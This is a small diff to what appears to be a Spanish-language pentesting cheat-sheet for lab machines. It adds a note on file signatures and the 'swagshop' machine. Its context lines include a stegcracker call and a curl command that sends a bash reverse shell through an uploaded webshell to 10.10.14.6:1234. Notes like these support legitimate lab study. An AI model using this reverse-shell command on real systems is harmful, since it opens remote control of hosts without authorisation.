@@ -384,4 +384,6 @@ stegcracker imagen.jpeg
 ******************************************************CURL**************************************************
 curl -X POST http://10.10.10.143/diego.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/1234 0>&1"' ejecutando comandos con curl y la webshell recientemente subida.
 
-
+*****************************************************Magic Binary******************************************************
+https://en.wikipedia.org/wiki/List_of_file_signatures
+máquina swagshop
